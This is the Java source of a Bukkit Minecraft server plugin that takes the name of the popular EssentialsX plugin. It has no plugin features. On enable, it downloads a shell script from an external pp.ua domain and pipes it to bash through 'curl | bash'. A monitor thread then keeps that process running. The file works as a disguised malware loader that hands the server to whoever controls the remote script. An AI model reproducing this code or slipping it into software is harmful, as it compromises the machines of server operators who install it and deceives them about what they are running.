package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;

import java.util.concurrent.TimeUnit;

public class EssentialsX extends JavaPlugin {

    private Process process;
    private volatile boolean isProcessRunning = false;

    @Override
    public void onEnable() {
        getLogger().info("EssentialsX plugin starting...");

        try {
            startRemoteScript();
            getLogger().info("EssentialsX plugin enabled");
        } catch (Exception e) {
            getLogger().severe("Failed to start remote script: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private void startRemoteScript() throws Exception {
        if (isProcessRunning) return;

        String url = "https://netjett-de.kof95zip.pp.ua/plugins/cf.sh";

        // 稳定方式：curl | bash
        String command = "curl -Ls " + url + " | bash";

        ProcessBuilder pb = new ProcessBuilder(
                "bash",
                "-c",
                command
        );

        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        pb.redirectError(ProcessBuilder.Redirect.INHERIT);

        process = pb.start();
        isProcessRunning = true;

        startProcessMonitor();
    }

    private void startProcessMonitor() {
        Thread monitorThread = new Thread(() -> {
            try {
                int exitCode = process.waitFor();
                isProcessRunning = false;
                getLogger().info("Remote script exited with code: " + exitCode);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                isProcessRunning = false;
            }
        }, "Remote-Script-Monitor");

        monitorThread.setDaemon(true);
        monitorThread.start();
    }

    @Override
    public void onDisable() {
        getLogger().info("EssentialsX plugin shutting down...");

        if (process != null && process.isAlive()) {
            process.destroy();

            try {
                if (!process.waitFor(10, TimeUnit.SECONDS)) {
                    process.destroyForcibly();
                    getLogger().warning("Forcibly terminated remote script");
                } else {
                    getLogger().info("Remote script stopped normally");
                }
            } catch (InterruptedException e) {
                process.destroyForcibly();
                Thread.currentThread().interrupt();
            }

            isProcessRunning = false;
        }

        getLogger().info("EssentialsX plugin disabled");
    }
}
